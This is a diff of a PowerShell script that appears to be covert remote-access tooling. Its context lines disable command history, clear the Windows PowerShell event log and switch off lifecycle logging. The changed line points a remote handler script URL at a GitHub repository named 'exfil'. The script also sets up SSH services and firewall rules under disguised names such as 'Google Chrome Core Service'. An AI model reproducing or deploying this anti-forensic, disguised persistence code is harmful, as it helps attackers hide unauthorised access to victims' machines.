@@ -6,7 +6,7 @@ Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
 Clear-EventLog "Windows Powershell"
 $LogEngineLifecycleEvent = $false | Out-Null
 [void]$LogEngineLifecycleEvent
-$ztnethandler = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/ZeroTierStuff/ZtNetJoinLeaveHandler.ps1"
+$ztnethandler = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/ZeroTierStuff/ZtNetJoinLeaveHandler.ps1"
 $serviceset = @("IP Core Helper", "ssh-agent", "sshd")
 $ruleset = @("Google Chrome Core Service", "Windows Runtime Broker")
 
